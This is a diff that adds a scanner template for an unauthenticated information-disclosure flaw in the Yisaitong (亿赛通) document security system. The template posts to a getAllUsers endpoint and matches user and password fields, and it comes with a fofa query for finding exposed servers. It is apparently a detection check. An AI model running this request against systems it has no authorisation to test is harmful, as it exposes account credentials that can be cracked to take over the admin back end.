@@ -1,0 +1,33 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: pageSize=100&pageNumber=1
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - password
+          - username
+          - '"code":0'
+          - surname
+          - mobilephone
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/CDGServer3/openapi/getAllUsers'
+id: yisaitong-getallusers-disclosure
+info:
+  author: Superhero
+  description: |-
+    fofa: body="/CDGServer3/index.jsp"
+    亿赛通电子文档安全管理系统 /CDGServer3/openapi/getAllUsers 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，进一步MD5解密即可登录后台，使系统处于极不安全的状态。
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 亿赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞
+  severity: high
+  tags: yisaitong,disclosure,argus-import
